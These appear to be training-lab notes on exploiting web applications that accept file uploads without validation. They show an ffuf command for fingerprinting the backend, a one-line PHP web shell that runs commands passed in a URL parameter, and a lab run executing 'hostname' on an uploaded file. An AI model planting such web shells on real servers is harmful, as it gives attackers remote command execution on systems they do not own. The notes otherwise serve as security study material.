# Absent Validation

Basic Exploitation : web application does not have any form of validation filters on the uploaded files

The file selector dialog does not specify any file type, as it says All Files

--> no file type restrictions on the front-end

If no restrictions were specified on the back-end, we might be able to upload arbitrary file types

## Identifying Web Framework

Find /index.ext

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ

--> using the Wappalyzer extension

## Vulnerability Identification

echo "<?php system($_GET["cmd"]); ?>" > shell.php

Upload shell.php

http://SERVER_IP:PORT/uploads/test.php

## LAB

echo "<?php system('hostname'); ?>" > shell.php

http://83.136.253.251:48204/uploads/shell.php

ng-786011-fileuploadsabsentverification-kiq02-58dfbf7cf7-nbljf 